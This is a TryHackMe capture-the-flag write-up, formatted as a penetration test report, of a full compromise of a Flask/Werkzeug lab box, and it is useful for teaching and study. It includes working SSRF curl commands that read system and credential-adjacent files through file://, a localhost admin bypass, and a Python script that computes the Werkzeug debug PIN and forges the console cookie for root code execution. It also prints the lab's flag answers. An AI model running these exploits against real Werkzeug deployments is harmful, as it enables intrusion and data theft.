# Penetration Test Report — Plant Photographer
**TryHackMe CTF | Target: `10.65.161.138` | Date: March 30, 2026**

![Status](https://img.shields.io/badge/Status-PWNED-red) ![Flags](https://img.shields.io/badge/Flags-3%2F3-brightgreen) ![Risk](https://img.shields.io/badge/Overall%20Risk-CRITICAL-red) ![Framework](https://img.shields.io/badge/Framework-PTES-blue)

---

## Table of Contents
1. [Pre-Engagement](#1-pre-engagement)
2. [Intelligence Gathering](#2-intelligence-gathering)
3. [Threat Modeling](#3-threat-modeling)
4. [Vulnerability Analysis](#4-vulnerability-analysis)
5. [Exploitation](#5-exploitation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Reporting](#7-reporting)
8. [Appendix](#8-appendix)

---

## Flags Captured

| # | Flag | Location | Method |
|---|------|----------|--------|
| 1 | `THM{Hello_Im_just_an_API_key}` | Hardcoded in `app.py` | Debug traceback disclosure |
| 2 | `THM{c4n_i_haz_flagz_plz?}` | `/admin` (localhost-restricted) | SSRF localhost bypass |
| 3 | `THM{SSRF2RCE_2_1337_4_M3}` | `/usr/src/app/flag-982374827648721338.txt` | RCE via Werkzeug cookie forgery |

---

## 1. Pre-Engagement

### 1.1 Scope & Objectives

Black-box web application penetration test against a single target host. The objective was to identify and exploit vulnerabilities to retrieve all hidden flags, simulating an external attacker with zero prior knowledge.

| Field | Value |
|-------|-------|
| Target IP | `10.65.161.138` / `10.66.188.141` |
| In-Scope Ports | `22/TCP` (SSH), `80/TCP` (HTTP) |
| Out-of-Scope | Any host other than the target |
| Rules of Engagement | Authorized CTF environment — no restrictions |
| Methodology | PTES — Penetration Testing Execution Standard |

### 1.2 Tools Used

| Tool | Purpose |
|------|---------|
| Nmap 7.98 | Network reconnaissance and service version detection |
| Feroxbuster 2.13.1 | Web content and directory discovery |
| curl | Manual HTTP request crafting and SSRF exploitation |
| Python 3 | Custom exploit scripts — PIN generation, cookie forgery, SSRF fuzzer |

---

## 2. Intelligence Gathering

### 2.1 Port & Service Scanning

```bash
nmap -sC -sV 10.65.161.138 -oX scan1
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| `22/TCP` | Open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| `80/TCP` | Open | HTTP | Werkzeug 0.16.0 / Python 3.10.7 — Title: Jay Green |

> **Note:** The SSH service was not attacked. The HTTP service running Werkzeug in debug mode was the primary attack surface.

### 2.2 Web Content Enumeration

```bash
feroxbuster -u http://10.65.161.138 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -o scan_web.json --json
```

| Endpoint | Status | Significance |
|----------|--------|--------------|
| `/` | 200 | Main portfolio page — Jay Green photographer |
| `/admin` | 200 | Admin endpoint — restricted to `127.0.0.1` (returns flag PDF) |
| `/download` | 200 | File download endpoint — **SSRF vector** via pycurl |
| `/console` | 200 | Werkzeug interactive debug console — PIN protected → **RCE** |
| `/static/imgs/*` | 200 | Static plant/profile images |

---

## 3. Threat Modeling

### 3.1 Attack Surface

- **HTTP Service (Port 80):** Flask/Werkzeug running with `debug=True` in production. User-controlled pycurl request in `/download`. Admin endpoint protected only by source IP check. Werkzeug console accessible.
- **SSH Service (Port 22):** OpenSSH 8.2p1 — no credentials identified, not attacked.

### 3.2 Full Attack Chain

```
[External Attacker]
        │
        ▼
[1] Trigger debug traceback via malformed ?id=
        │ Source code + API key disclosed (Flag 1)
        ▼
[2] SSRF via file:// in server parameter
        │ Read: /etc/passwd, /proc/self/cgroup, MAC address,
        │       app.py, Dockerfile, werkzeug/debug/__init__.py
        ▼
[3] SSRF localhost bypass → /admin
        │ Flag 2 PDF exfiltrated
        ▼
[4] Werkzeug source confirms: MD5 algo + machine_id = docker hash
        │
        ▼
[5] PIN computed + auth cookie forged client-side
        │ Exhaustion lockout bypassed entirely
        ▼
[6] RCE via /console as root
        │ find + read → Flag 3
        ▼
[FULL COMPROMISE — root shell available]
```

---

## 4. Vulnerability Analysis

### 4.1 Source Code Disclosure via Debug Traceback

Submitting a non-integer `?id=` value triggered a Python `ValueError`. Because `debug=True` was active, Werkzeug returned the **full application source code** in the HTTP response body — including parameter names, URL construction logic, hardcoded credentials, and file paths.

**Trigger:**
```bash
curl "http://10.65.161.138/download?id=../../../etc/passwd"
```

**Leaked source (app.py line 31–34):**
```python
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
crl.perform()
```

**Key intelligence extracted:**
- Parameters are `?id=` (integer) and `?server=` (URL, unsanitized)
- `server` is fed directly to pycurl with no validation
- API key hardcoded in plain text
- App path: `/usr/src/app/app.py`
- Flask path: `/usr/local/lib/python3.10/site-packages/flask/app.py`

---

### 4.2 Server-Side Request Forgery (SSRF) — `/download`

The `server` parameter is concatenated directly into a pycurl URL. pycurl supports the `file://` URI scheme. A trailing `?` causes pycurl to treat the appended path as a query string which `file://` ignores — enabling clean local file reads.

**Exploit pattern:**
```bash
curl "http://10.65.161.138/download?id=1&server=file:///etc/passwd?"
```

**Files successfully exfiltrated:**

| File | Data Retrieved |
|------|---------------|
| `/etc/passwd` | OS users — Alpine Linux, `/bin/ash` shell |
| `/sys/class/net/eth0/address` | MAC: `02:42:ac:14:00:02` |
| `/proc/self/status` | UID 0 (root), PID 7 |
| `/proc/self/cgroup` | Docker hash: `77c09e05c4a9...` |
| `/proc/sys/kernel/random/boot_id` | `ed5e056b-aca9-4500-8dd5-c7ac0734e1eb` |
| `/usr/src/app/app.py` | Full application source |
| `/usr/src/app/Dockerfile` | Internal hostname mapping: `secure-file-storage.com → 127.0.0.1` |
| `/usr/local/lib/.../werkzeug/debug/__init__.py` | PIN algorithm source — **critical** |

---

### 4.3 Admin Localhost Bypass

The `/admin` route uses a naive IP check to restrict access:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
```

Since SSRF allows the server to make HTTP requests to itself, the request appears to originate from `127.0.0.1` — satisfying the check.

```bash
curl "http://10.65.161.138/download?id=1&server=http://127.0.0.1:8087/admin?" \
  --output flag.pdf
```

---

### 4.4 Werkzeug PIN Bypass via Cookie Forgery

Reading `werkzeug/debug/__init__.py` via SSRF revealed three critical facts:

1. **Algorithm is MD5 only** — not SHA1 (common incorrect assumption)
2. **`machine_id`** = first line of `/proc/self/cgroup` split on `/docker/` → just the container hash
3. **Auth is cookie-based** — cookie value = `{timestamp}|{md5(pin + b'shittysalt')[:12]}`

```python
# From Werkzeug source (hash_pin function):
def hash_pin(pin):
    return hashlib.md5(pin + b"shittysalt").hexdigest()[:12]

# Auth cookie set on success:
rv.set_cookie(self.pin_cookie_name, "%s|%s" % (int(time.time()), hash_pin(self.pin)))

# Exhaustion check:
elif self._failed_pin_auth > 10:
    exhausted = True
```

By computing the PIN and forging the cookie client-side, the exhaustion lockout was bypassed entirely without ever submitting a PIN attempt.

---

## 5. Exploitation

### Finding 1 — API Key via Debug Traceback

![Severity](https://img.shields.io/badge/Severity-HIGH-orange) ![CVSS](https://img.shields.io/badge/CVSS-7.5-orange)

| Field | Detail |
|-------|--------|
| Vulnerability | Werkzeug Debug Mode Active in Production |
| CWE | CWE-209: Error Message Containing Sensitive Information |
| CVSS Score | 7.5 (High) — Network / Low Complexity / No Auth |
| **Flag** | **`THM{Hello_Im_just_an_API_key}`** |
| Location | Hardcoded in `X-API-KEY` header — `/usr/src/app/app.py` line 34 |

**Attack chain:**
1. Send malformed `id` to trigger `ValueError`
2. Werkzeug returns full source code in traceback
3. API key extracted from hardcoded `X-API-KEY` header value

**Impact:** Exposes API key for internal backend. Debug mode also exposes `/console` RCE vector.

---

### Finding 2 — Admin Flag via SSRF Localhost Bypass

![Severity](https://img.shields.io/badge/Severity-CRITICAL-red) ![CVSS](https://img.shields.io/badge/CVSS-9.1-red)

| Field | Detail |
|-------|--------|
| Vulnerability | SSRF + Insecure IP-Based Access Control |
| CWE | CWE-918: Server-Side Request Forgery / CWE-441: Unintended Proxy |
| CVSS Score | 9.1 (Critical) — Network / Low Complexity / No Auth |
| **Flag** | **`THM{c4n_i_haz_flagz_plz?}`** |
| Location | `/usr/src/app/private-docs/flag.pdf` |

**Attack chain:**
1. Source code reveals `/admin` checks `request.remote_addr == '127.0.0.1'`
2. SSRF routes request through server itself:
```bash
curl "http://10.65.161.138/download?id=1&server=http://127.0.0.1:8087/admin?" \
  --output flag.pdf
```
3. Request originates from localhost — IP check satisfied — flag PDF returned

**Impact:** Full bypass of localhost access control. Attacker can access any internal HTTP service.

---

### Finding 3 — RCE via Werkzeug Console Cookie Forgery

![Severity](https://img.shields.io/badge/Severity-CRITICAL-red) ![CVSS](https://img.shields.io/badge/CVSS-10.0-red)

| Field | Detail |
|-------|--------|
| Vulnerability | Predictable PIN + Forgeable Auth Cookie → RCE |
| CWE | CWE-330: Insufficient Randomness / CWE-287: Improper Authentication |
| CVSS Score | 10.0 (Critical) — Full impact across CIA triad |
| **Flag** | **`THM{SSRF2RCE_2_1337_4_M3}`** |
| Location | `/usr/src/app/flag-982374827648721338.txt` |
| Access Level | `root` (UID 0) — full container compromise |

**Attack chain:**

**Step 1 — Read Werkzeug source via SSRF:**
```bash
curl "http://10.65.161.138/download?id=1&server=file:///usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py?"
```

**Step 2 — Compute PIN and forge auth cookie (`exploit5.py`):**
```python
import hashlib, requests, time

machine_id = "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca"
mac_str    = str(int("0242ac140002", 16))
app_path   = "/usr/local/lib/python3.10/site-packages/flask/app.py"

# Compute PIN (MD5, not SHA1)
h = hashlib.md5()
for bit in ["root", "flask.app", "Flask", app_path, mac_str, machine_id]:
    h.update(bit.encode("utf-8"))
h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = num[:3] + "-" + num[3:6] + "-" + num[6:]  # → 110-688-511

# Forge auth cookie — bypasses exhaustion lockout entirely
pin_hash   = hashlib.md5(pin.encode("utf-8") + b"shittysalt").hexdigest()[:12]
cookie_val = f"{int(time.time())}|{pin_hash}"
cookies    = {cookie_name: cookie_val}

# Console now trusted — execute commands
r = requests.get("http://10.65.161.138/", cookies=cookies,
    params={"__debugger__": "yes", "cmd": "import os; os.popen('id').read()",
            "frm": "0", "s": "YRua5EJ3uAdoBVfMAv8O"})
```

**Step 3 — Execute in `/console` browser interface:**
```python
# Find the flag
import os; os.popen('find / -name "*.txt" 2>/dev/null | grep -vE "proc|sys|lib|share"').read()
# → '/usr/src/app/requirements.txt\n/usr/src/app/flag-982374827648721338.txt'

# Read it
open('/usr/src/app/flag-982374827648721338.txt').read()
# → 'THM{SSRF2RCE_2_1337_4_M3}'
```

**Impact:** Full root-level RCE inside Docker container. Attacker can read all files, spawn reverse shells, pivot to internal services, and destroy the application.

---

## 6. Post-Exploitation

### 6.1 Access Achieved

| Field | Value |
|-------|-------|
| Access Level | root (UID 0) via Werkzeug Python console |
| Container OS | Alpine Linux (Docker) — `/bin/ash` |
| RCE Method | `/console` — auth cookie forged, PIN lockout bypassed |
| Shell | Full reverse shell spawnable via `subprocess` |

### 6.2 All Flags Captured ✅

| # | Flag | Method |
|---|------|--------|
| 🚩 1 | `THM{Hello_Im_just_an_API_key}` | Debug traceback → source code disclosure |
| 🚩 2 | `THM{c4n_i_haz_flagz_plz?}` | SSRF localhost bypass on `/admin` |
| 🚩 3 | `THM{SSRF2RCE_2_1337_4_M3}` | RCE via Werkzeug cookie forgery |

### 6.3 Server Data Collected

| Item | Value |
|------|-------|
| OS | Alpine Linux (Docker container) |
| User | root (UID 0) |
| App path | `/usr/src/app/app.py` |
| MAC address | `02:42:ac:14:00:02` |
| Docker hash | `77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca` |
| Boot ID | `ed5e056b-aca9-4500-8dd5-c7ac0734e1eb` |
| Internal host | `secure-file-storage.com → 127.0.0.1:8087` |
| Werkzeug PIN | `110-688-511` (md5, root, flask/app.py, docker hash) |

---

## 7. Reporting

### 7.1 Risk Summary

| Vulnerability | Severity | Exploitability | Impact |
|---------------|----------|---------------|--------|
| Debug mode active in production | 🟠 HIGH | Trivial | Source code + secrets exposed |
| SSRF via `/download` | 🔴 CRITICAL | Easy | File read, internal pivot |
| Admin IP bypass via SSRF | 🔴 CRITICAL | Easy | Confidential data exfiltration |
| Werkzeug console exposed | 🔴 CRITICAL | Moderate | Full RCE as root |
| Predictable PIN + forgeable cookie | 🔴 CRITICAL | Moderate | Auth bypass + console access |
| Hardcoded API key in source | 🟠 HIGH | Trivial | Unauthorized backend access |

### 7.2 Recommendations

#### 🔴 Critical — Fix Immediately

- **Disable Werkzeug debug mode** — Set `debug=False`. Never expose `/console` or debug tracebacks in production.
- **Sanitize the `server` parameter** — Allowlist URL schemes (HTTPS only). Block `file://`, `gopher://`, `ftp://`. Validate hosts against an allowlist. Block RFC-1918 addresses.
- **Remove hardcoded credentials** — Store API keys in environment variables or a secrets manager (Vault, AWS Secrets Manager).

#### 🟠 High — Fix Soon

- **Replace IP-based access control** — Implement session-based authentication on `/admin`. IP checks are trivially bypassed via SSRF, `X-Forwarded-For`, and proxy chains.
- **Restrict internal service access** — Internal storage service should require mutual TLS, not rely solely on network location trust.

#### 🟡 Long-Term — Defence in Depth

- **SSRF egress proxy** — Deploy outbound proxy blocking RFC-1918 ranges from app-layer requests.
- **Container hardening** — Run Flask as non-root user. Apply seccomp/AppArmor profiles. Drop unnecessary Linux capabilities.
- **CI/CD secrets scanning** — Integrate `truffleHog` or `gitleaks` to detect hardcoded secrets before deployment.

---

## 8. Appendix

### 8.1 Complete Attack Timeline

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Ports 22, 80 open — Werkzeug 0.16.0 identified |
| 2 | Feroxbuster | `/admin`, `/download`, `/console` discovered |
| 3 | Malformed `?id=` triggers traceback | Full source code disclosed |
| 4 | Source code analysed | Flag 1 extracted + SSRF vector identified |
| 5 | SSRF file:// confirmed | Server metadata collected (MAC, cgroup, boot_id) |
| 6 | SSRF localhost bypass on `/admin` | Flag 2 PDF downloaded |
| 7 | Werkzeug source read via SSRF | MD5 algorithm + cookie forge method confirmed |
| 8 | PIN computed + cookie forged | `/console` unlocked — lockout bypassed |
| 9 | RCE via browser console | `find` located `flag-982374827648721338.txt` |
| 10 | Flag file read | Flag 3 captured |

### 8.2 Key Commands Reference

```bash
# Trigger debug traceback (Flag 1)
curl "http://10.65.161.138/download?id=../../../etc/passwd"

# SSRF file read pattern
curl "http://10.65.161.138/download?id=1&server=file:///etc/passwd?"

# Read MAC address
curl "http://10.65.161.138/download?id=1&server=file:///sys/class/net/eth0/address?"

# Read Docker cgroup hash
curl "http://10.65.161.138/download?id=1&server=file:///proc/self/cgroup?"

# Read app source
curl "http://10.65.161.138/download?id=1&server=file:///usr/src/app/app.py?"

# Read Werkzeug debug source (critical for PIN algo)
curl "http://10.65.161.138/download?id=1&server=file:///usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py?"

# Flag 2 — SSRF localhost bypass
curl "http://10.65.161.138/download?id=1&server=http://127.0.0.1:8087/admin?" --output flag.pdf

# Cookie forge + console unlock
python3 exploit5.py

# Flag 3 — in /console
import os; os.popen('find / -name "*.txt" 2>/dev/null | grep -vE "proc|sys|lib|share"').read()
open('/usr/src/app/flag-982374827648721338.txt').read()
```

### 8.3 Werkzeug PIN Algorithm (v0.16.0)

> ⚠️ The algorithm uses **MD5**, not SHA1 — a common mistake that causes all generated PINs to be wrong.

```python
import hashlib

# Inputs
username   = "root"                          # getpass.getuser()
mac_str    = str(int("0242ac140002", 16))    # uuid.getnode() as string
machine_id = "77c09e05..."                   # /proc/self/cgroup .partition('/docker/')[2]
app_path   = "/usr/local/lib/python3.10/site-packages/flask/app.py"

# PIN generation
h = hashlib.md5()
for bit in [username, "flask.app", "Flask", app_path, mac_str, machine_id]:
    h.update(bit.encode("utf-8"))
h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = num[:3] + "-" + num[3:6] + "-" + num[6:]

# Cookie forge (bypasses exhaustion lockout — no PIN attempt needed)
pin_hash   = hashlib.md5(pin.encode("utf-8") + b"shittysalt").hexdigest()[:12]
cookie_val = f"{int(time.time())}|{pin_hash}"
# Set cookie {cookie_name: cookie_val} on any request to /console
```

### 8.4 Disclosed App Source (`app.py`)

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':          # bypassed via SSRF
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server  = request.args.get('server','')          # unsanitized SSRF vector
    if file_id != '':
        filename = str(int(file_id)) + '.pdf'        # int() causes traceback on non-int
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])  # Flag 1
        crl.perform()
```

---








